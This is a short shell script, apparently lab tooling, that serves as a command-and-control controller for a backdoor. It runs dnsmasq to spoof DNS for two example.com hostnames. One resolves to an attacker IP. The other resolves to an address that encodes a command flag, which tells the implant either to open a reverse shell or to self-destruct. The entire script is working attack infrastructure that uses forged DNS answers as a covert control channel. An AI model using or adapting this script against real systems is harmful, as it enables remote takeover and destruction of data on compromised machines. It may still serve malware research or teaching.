#!/bin/sh 
ATTACK_IP=10.10.75.228
SAMPLE_IP=10.10.75.0

MODE=$1

if [ "$MODE" = "" ]; then
	MODE=neutral
fi

case $MODE in
	neutral)
		FLAGS=
		;;
	shell)
		FLAGS=BD_CNC_RSHELL_FLAG
		;;
	destruct)
		FLAGS=BD_CNC_SELF_DESTRUCT
		;;
	*)
		echo "Unrecognized mode $MODE"
		exit
		;;
esac

dnsmasq -A /www.example.com/$ATTACK_IP -A /updates.example.com/$(./make_cnc_ip $SAMPLE_IP $FLAGS) -d -q
